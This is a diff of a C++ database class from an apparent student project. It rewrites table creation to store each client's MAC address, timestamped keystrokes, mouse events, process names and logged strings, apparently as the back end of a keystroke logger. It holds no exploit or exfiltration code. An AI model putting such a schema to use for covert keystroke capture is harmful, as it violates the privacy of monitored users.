@@ -5,7 +5,7 @@
 // Login   <bertra_l@epitech.net>
 // 
 // Started on  Wed Oct 21 21:04:15 2015 Bertrand-Rapello Baptiste
-// Last update Fri Nov  6 12:13:42 2015 Antoine Plaskowski
+// Last update Fri Nov  6 13:36:57 2015 Antoine Plaskowski
 //
 
 #include	<ncurses.h>
@@ -34,46 +34,44 @@ Database::~Database(void)
   mysql_close(m_sql);
 }
 
-bool Database::select_db(std::string const & db)
+bool	Database::select_db(std::string const &db)
 {
-  // MYSQL_RES *res;
-  // MYSQL_FIELD *field;
-  // MYSQL_ROW row;
-  int rtr = 0;
-  // int ret = 0;
-  // unsigned int nbFields = 0;
-  // unsigned long long nbRows = 0;
-  std::string cmd;
-  // std::string rtrBis;
-  
-  cmd = "CREATE DATABASE ";
-  rtr = mysql_select_db(m_sql, db.c_str());
-  if (rtr != 0)
-    {
-      std::cout << "il faut créer la bdd" << std::endl;
-      cmd += db;
-      rtr = mysql_query(m_sql, cmd.c_str());
-      if (rtr != 0)
-	return true;
-      else
-	{
-	  rtr = mysql_select_db(m_sql, db.c_str());
-	  cmd = "CREATE TABLE client (id int, mac_address VARCHAR(18));";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE keyboard_input (id_client INT, day DATE, hours TIME, id_key INT , state TEXT, id_process int);";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE keyboard_mouse (id_client INT, day DATE, hours TIME, id_button INT, state TEXT, id_process int);";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE log_input (id INT, log TEXT);";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE key_string (id INT, id_key TEXT);";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE mouse_string (id INT, button TEXT);";
-	  rtr = mysql_query(m_sql, cmd.c_str());
-	  cmd = "CREATE TABLE software_used (id INT, soft_name TEXT);";
-	  rtr = mysql_query(m_sql, cmd.c_str());	  
-	}
-    }
+  std::string	cmd;
+  char	*buf = new char[db.size() * 2 + 1];
+
+  if (mysql_real_escape_string(m_sql, buf, db.c_str(), db.size()) == -1)
+    throw std::exception();
+  cmd = "CREATE DATABASE IF NOT EXISTS ";
+  cmd += buf;
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  if (mysql_select_db(m_sql, buf) != 0)
+    throw std::exception();
+  delete[] buf;
+  cmd = "CREATE TABLE IF NOT EXISTS client (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, mac_address CHARACTER(6) NOT NULL);";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS keyboard_input (id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_key BIGINT NOT NULL , state BIGINT NOT NULL, id_process BIGINT NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS mouse_input (id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_button BIGINT NOT NULL, state VARCHAR(255) NOT NULL, id_process BIGINT NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS log_input (id_client BIGINT NOT NULL, string VARCHAR(255) NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS key_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS mouse_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS process_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
+  cmd = "CREATE TABLE IF NOT EXISTS event_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
+  if (mysql_query(m_sql, cmd.c_str()) != 0)
+    throw std::exception();
   return false;
 }
 
